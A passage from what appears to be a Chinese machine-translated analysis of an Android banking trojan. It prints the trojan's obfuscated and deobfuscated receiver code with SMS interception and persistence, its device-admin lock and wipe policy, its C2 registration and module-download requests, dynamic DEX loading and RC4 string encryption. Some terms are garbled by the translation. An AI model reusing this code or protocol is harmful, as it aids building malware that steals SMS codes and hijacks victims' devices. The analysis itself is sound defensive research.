class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.dYDbaxro"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.HvGIrpl"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.wfozbladhvnk.ibvtgx.iyqvybm.HnzCyZAKNVN"</span></span></span><span class="hljs-tag">/&gt;</span></span></code> </pre> <br> 通常，该恶意软件不会使用任何超自然的东西，它不会在Android上使用任何0天。 攻击者需要从受害者那里获得一个许可，而无需再获得更多许可，那么恶意软件便会自己做所有事情。 <br><br>  Google将需要限制非播放应用程序的某些API功能。 <br><br><h2> 接收者 </h2><br> 此类的代码已被混淆，但这并不妨碍对其进行研究。 <br><br><div class="spoiler">  <b class="spoiler_title">混淆码</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onReceive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context, Intent intent)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i; C0005b bVar; String str; String sb; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo39d(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f243g).contains(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f45aS) &amp;&amp; !<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo32b(context)) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo24a(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f347d, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f46aT); C0005b bVar2 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.getClass(); C0005b.m16a(context, <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-number"><span class="hljs-number">10000</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i2 = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (i2 &lt; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec.length) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (VERSION.SDK_INT &gt;= <span class="hljs-number"><span class="hljs-number">26</span></span> &amp;&amp; !<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f346c.mo14b(context)) { <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo25a(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2])) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ppknbeydxzuwxxv.class.getName().equals(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2].getName())) { context.stopService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2])); } bVar = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; str = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f347d; StringBuilder sb2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); sb2.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f90bK); sb2.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2]); sb = sb2.toString(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (lsbcgaldiywkd.class.getName().equals(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2].getName())) { context.startService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2])); bVar = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; str = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f347d; StringBuilder sb3 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); sb3.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f88bI); sb3.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2]); sb = sb3.toString(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> parseInt = Integer.parseInt(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo39d(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f47aU)); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.getClass(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (parseInt &gt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) { context.startService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2])); bVar = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; str = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f347d; StringBuilder sb4 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); sb4.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f89bJ); sb4.append(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f241ec[i2]); sb = sb4.toString(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { i2++; } } bVar.mo24a(str, sb); i2++; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo23a(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f347d, context); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo22a(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f259w, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo33b(context, pzjzcxauihlf.class) ? <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f42aP : <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f39aM); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (intent.getAction().equals(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f29aC)) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo20a(context, intent); } <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { i = Integer.parseInt(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo39d(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f58af)); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> parseInt2 = Integer.parseInt(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo39d(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f57ae)) + <span class="hljs-number"><span class="hljs-number">1</span></span>; i++; C0005b bVar3 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; String str2 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f57ae; StringBuilder sb5 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.getClass(); sb5.append(<span class="hljs-string"><span class="hljs-string">""</span></span>); sb5.append(parseInt2); bVar3.mo22a(context, str2, sb5.toString()); C0005b bVar4 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; String str3 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f58af; StringBuilder sb6 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.getClass(); sb6.append(<span class="hljs-string"><span class="hljs-string">""</span></span>); sb6.append(i); bVar4.mo22a(context, str3, sb6.toString()); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception e2) { e = e2; i = <span class="hljs-number"><span class="hljs-number">0</span></span>; C0005b bVar5 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; String str4 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f252p; StringBuilder sb7 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); sb7.append(<span class="hljs-string"><span class="hljs-string">"(pro8) | vvcy "</span></span>); sb7.append(e.toString()); sb7.append(<span class="hljs-string"><span class="hljs-string">"::endLog::"</span></span>); bVar5.mo31b(context, str4, sb7.toString()); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (i &gt;= <span class="hljs-number"><span class="hljs-number">3</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (i &gt;= <span class="hljs-number"><span class="hljs-number">3</span></span> &amp;&amp; !<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo46i(context) &amp;&amp; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo48k(context) &amp;&amp; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo33b(context, pzjzcxauihlf.class)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo33b(context, pzjzcxauihlf.class)) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b.mo22a(context, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f12M, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f42aP); } Intent intent2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, lvhxcug.class); intent2.putExtra(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f87bH, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f42aP); intent2.addFlags(<span class="hljs-number"><span class="hljs-number">268435456</span></span>); intent2.addFlags(<span class="hljs-number"><span class="hljs-number">536870912</span></span>); intent2.addFlags(<span class="hljs-number"><span class="hljs-number">1073741824</span></span>); context.startActivity(intent2); C0005b bVar6 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f345b; String str5 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.f58af; StringBuilder sb8 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f344a.getClass(); sb8.append(<span class="hljs-string"><span class="hljs-string">""</span></span>); sb8.append(<span class="hljs-number"><span class="hljs-number">0</span></span>); bVar6.mo22a(context, str5, sb8.toString()); } } }</code> </pre> <br></div></div><br> 现在对代码进行一些解释。 <br><br>  Malvari设置存储在XML文件中，该文件位于目录<i>/data/data/package_name/shared_prefs/Settings.xml中</i> <br><br><ul><li>  public String ReadXML-读取设置的方法 </li><li>  public String SaveXML-保存设置的方法 </li><li>  public boolean DozeMode-检查是否启用了打ze模式 </li><li> 公共类Service_fa扩展了Service-服务，用于组装设备的物理活动（台阶，摇动手机等） </li><li> 公共类Service_server扩展Service-用于连接到服务器的服务 </li><li> 公共类Service_event_loop扩展Service-在无限循环中运行的服务，用于执行malvari的某些功能 </li><li>  public void startOffDozeMode-请求禁用打ze模式 </li><li>  public void startAlarm-每10秒启动接收器 </li><li> 公共无效拦截SMS-用于SMS拦截的方法 </li><li>  public boolean isAccessibilityService-检查是否启用Accesibility服务的方法 </li><li>  public boolean cis-一种阻止属于独联体国家的马尔瓦里河变流的方法，即：ua，ru，by，tj，uz，tm，az，am，kz，kg和md（国家的缩写） </li></ul><br> 我试图将上面的混淆代码变成一种更具可读性和正常的形式： <br><br><div class="spoiler">  <b class="spoiler_title">可读代码</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onReceive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context, Intent intent)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> Class[] arrayService = {Service_fa.class, Service_server.class, Service_event_loop.class}; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((!ReadXML(context, <span class="hljs-string"><span class="hljs-string">"kill"</span></span>).contains(<span class="hljs-string"><span class="hljs-string">"dead"</span></span>)) &amp;&amp; (!cis(context))) { startAlarm(context, <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-number"><span class="hljs-number">10000</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arrayService.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((Build.VERSION.SDK_INT &gt;= <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp;&amp; (!DozeMode(context))) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!isMyServiceRunning(context, arrayService[i])) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Service_fa.class.getName().equals(arrayService[i].getName())) { startService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, arrayService[i])); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Integer.parseInt(ReadXML(context, <span class="hljs-string"><span class="hljs-string">"step"</span></span>)) &gt;= <span class="hljs-number"><span class="hljs-number">1</span></span>) { startService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, arrayService[i])); } }<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(Service_server.class.getName().equals(arrayService[i].getName())){ stopService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, arrayService[i])); } } } startOffDozeMode(context); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (intent.getAction().equals(<span class="hljs-string"><span class="hljs-string">"android.provider.Telephony.SMS_RECEIVED"</span></span>)) { interceptionSMS(context, intent); <span class="hljs-comment"><span class="hljs-comment">//   } if (isAdminDevice(context)) { if ((getScreenBoolean(context)) &amp;&amp; (isAccessibilityServiceEnabled(context, srvSccessibility.class))) { if (isAccessibilityServiceEnabled(context, srvSccessibility.class)) { SaveXML(context, consts.autoClick, "1"); } Intent intent = new Intent(context, Admin.class); intent.putExtra("admin", "1"); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY); startActivity(intent); } } } public void interceptionSMS(Context context, Intent intent){ Bundle bundle = intent.getExtras(); if (bundle != null) { final Object[] pdus = (Object[]) bundle.get(consts.string_116); String number = ""; String text = ""; if (pdus != null) { for (Object aPdusObj : pdus) { SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) aPdusObj); number = smsMessage.getDisplayOriginatingAddress(); text += smsMessage.getDisplayMessageBody(); } SaveXML(context, "LogSMS", "Number: " + number + " Text: " + text + "::endLog::"); } } } }</span></span></code> </pre> <br></div></div><br> 因此，我认为该代码已为许多读者所理解。 <br><br> 接收器有3个触发条件，分别是重新启动设备，接收SMS或Alarmon启动时。 <br><br> 接收器还启动3种服务： <br><br><ul><li> 收集设备的身体活动（Service_fa） </li><li> 连接服务器的服务（Service_server） </li><li> 以无限周期运行的服务，用于执行malvari的某些功能（Service_event_loop） </li></ul><br> 首先，启动Service_fa，并且只有在设备处于活动状态之后（如果手机的所有者在走路并且手机在晃动），才启动Service_server和Service_event_loop。 它们是恶意软件的主要过程，因此恶意软件可以从模拟器和接收器，影音设备等设备中剔除真实设备。 <br><br>  Receiver还会启动打ze模式断开连接请求和管理员确认请求。 <br><br> 由于该恶意软件具有管理员权限，因此只有在删除权限后才能将其从设备中删除。 <br><br><h2> 管理员权限 </h2><br> 让我们来看看使用管理设备带来的可能性。 <br><br><pre> <code class="xml hljs"><span class="hljs-comment"><span class="hljs-comment">&lt;!-- ADMIN DEVICE XML --&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">device-admin</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:android</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:layout_width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"match_parent"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:layout_height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"match_parent"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-policies</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">force-lock</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">wipe-data</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-policies</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">device-admin</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  force-lock元素负责锁定设备的屏幕锁定，擦除数据负责删除DATA，CACHE和设备上的所有内存（完全重置）。 <br><br><h2>  Service_fa </h2><br> 这样，我们最终将着眼于Receiver，并考虑其他服务。 该服务使用SensorManager类从传感器传感器获取数据，该服务仅接收活动数据并将其保存到XML文件中。 <br><br> 因此，恶棍将能够获取活动历史并对其进行分析，以淘汰模拟器，尤其是懒惰的用户。 <br><br><h2> 服务服务器 </h2><br> 创建此流是为了与服务器进行通信，使用R​​C4加密算法以加密的形式将数据传输到服务器，该算法对base64之后的所有内容进行编码。 <br><br> 服务启动时，对服务器的第一个请求如下所示： <br><br><pre> <code class="json hljs"> { <span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-string"><span class="hljs-string">"qoietjeoisfhjdfhk"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"idSettings"</span></span>:<span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-attr"><span class="hljs-attr">"number"</span></span>:<span class="hljs-string"><span class="hljs-string">"+79999999999"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statAdmin"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statProtect"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statScreen"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statAccessibilty"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statSMS"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statCards"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statBanks"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statMails"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"activeDevice"</span></span>:<span class="hljs-string"><span class="hljs-string">"53"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"timeWorking"</span></span>:<span class="hljs-string"><span class="hljs-string">"342"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"statDownloadModule"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"batteryLevel"</span></span>:<span class="hljs-string"><span class="hljs-string">"78"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"locale"</span></span>:<span class="hljs-string"><span class="hljs-string">"fr"</span></span> }</code> </pre><br> 我以参数名称的名义随机填充了发送到服务器的数据，我认为一切都清楚是由谁负责，我们不会停止对其进行分析。 <br> 现在我们看一下服务器响应是什么，恶意软件会检查是否返回空答案，如果是，那么它将开始循环遍历服务器域数组并将此请求发送到每个域，并且响应中是否包含==“〜I〜”行，恶意软件会在此域停止并开始使用它。 <br><br> 我们已经确定了要使用的领域，现在我们在寻找其余的答案。 <br><br> 如果响应==“ || youNeedMoreResources ||”，则返回 然后立即向服务器发出请求以获取其他malvari模块： <br>  <i>gate_url？操作= getModule和数据= {“ idbot”：“ qoietjeoisfhjdfhk”}</i> <br> 继续，响应==“ ||否||” <br>  <i>向服务器发送gate_url？操作=注册和数据= JSON</i>请求： <br><pre> <code class="json hljs"> { <span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-string"><span class="hljs-string">"qoietjeoisfhjdfhk"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"android"</span></span>: Build.VERSION.RELEASE, <span class="hljs-attr"><span class="hljs-attr">"tag"</span></span>:<span class="hljs-string"><span class="hljs-string">"tag"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"country"</span></span>:<span class="hljs-string"><span class="hljs-string">"fr"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"operator"</span></span>:<span class="hljs-string"><span class="hljs-string">"Megafon"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"model"</span></span>:<span class="hljs-string"><span class="hljs-string">"Samsung Galaxy S9"</span></span> }</code> </pre> <br> 该请求用于在管理面板中注册新用户，这是服务器请求的结尾。 <br><br> 但是下面有一个条件检查“ system.apk”文件的存在。 <br><br> 混淆代码： <br><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(getDir(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f301a.f215dd, <span class="hljs-number"><span class="hljs-number">0</span></span>), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.f301a.f115bj).exists()){}</code> </pre> <br> 简化代码： <br><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(getDir(<span class="hljs-string"><span class="hljs-string">"apk"</span></span>, Context.MODE_PRIVATE), <span class="hljs-string"><span class="hljs-string">"system.apk"</span></span>).exists()) {}</code> </pre> <br> 如果文件存在，则以以下形式生成JSON： <pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"params"</span></span>:<span class="hljs-string"><span class="hljs-string">"updateSettingsAndCommands"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>:<span class="hljs-string"><span class="hljs-string">"data"</span></span> }</code> </pre> <br> 来自服务器的响应传递给response参数，然后将json传递给system.apk模块中的方法，并使用DexClassLoader类执行该方法。 <br><br><h2>  Service_event_loop </h2><br> 该服务循环运行，并等待命令阻止设备。 使用管理员权限将设备阻止在循环中。 <br><br><pre> <code class="java hljs">DevicePolicyManager deviceManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE); deviceManager.lockNow();</code> </pre> <br> 该服务可以禁用管理员权限，显然，恶意软件的作者决定为恶意软件的“自毁”进行此操作，以免在受害者的电话上留下痕迹。 <br><br><pre> <code class="java hljs"> ComponentName componentName = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ComponentName(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, DeviceAdmin.class); DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE); devicePolicyManager.removeActiveAdmin(componentName);</code> </pre> <br> 此外，该周期具有2秒的运行速度，分别为1秒和8秒，如果禁用了无障碍服务，它将在第一秒开始工作并要求启用此服务，只需打开``活动''并强制启用特殊功能，实际上我们将对此进行详细考虑。 <br><br> 在周期的最后，还有一个类似于Service_server的实现，但具体是将命令发送到已加载模块“ system.apk”内部的方法，但是参数没有太大不同，请参阅JSON： <br><br><pre> <code class="json hljs"> { <span class="hljs-attr"><span class="hljs-attr">"params"</span></span>:<span class="hljs-string"><span class="hljs-string">"serviceWorkingWhile"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"tick"</span></span>:<span class="hljs-string"><span class="hljs-string">"100"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"idbot"</span></span>:<span class="hljs-string"><span class="hljs-string">"qoietjeoisfhjdfhk"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"accessibility"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span> }</code> </pre> <br> 勾号-服务周期计数的秒数，可访问性-检查是否启用了Accesibility Service。 <br><br><h2> 类字符串 </h2><br> 该类中的所有行都使用RC4算法加密，然后以base64编码。 <br><br> 一个例子： <br><br> 加密的字符串：yyshybiwijujYzdkZDdkMjRlYjJmYjU5Y2Qw <br> 其中straka的前12个字符是RC4算法的解密密钥 <br> 钥匙：yyshybiwijuj <br> 密文：YzdkZDdkMjRlYjJmYjU5Y2Qw <br><br> 这是类代码String的一部分 <br><br><pre> <code class="java hljs"> <span class="hljs-comment"><span class="hljs-comment">/* renamed from: A */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f0A = mo1a(<span class="hljs-string"><span class="hljs-string">"yyshybiwijujYzdkZDdkMjRlYjJmYjU5Y2Qw"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: B */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f1B = mo1a(<span class="hljs-string"><span class="hljs-string">"dfpzkejthefgZDA1NTUyNmJiYWU4M2ViMjhjMGJmNTYx"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: C */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f2C = mo1a(<span class="hljs-string"><span class="hljs-string">"ewpskxnrtsvaMTBkOWRmZDAxZTZjNjkxZjhiYzYyOA=="</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: D */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f3D = mo1a(<span class="hljs-string"><span class="hljs-string">"ugqxhrpujzmaYTgwZjQ0NjBhN2Y1YmM1MDhjZjdkZWEwYzljZGIxOWY4NDEy"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: E */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String f4E = mo1a(<span class="hljs-string"><span class="hljs-string">"xlzrjjolkozwZTRjOGY5OTZjMTExMTgwYTE0ZGQ="</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* renamed from: F */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span 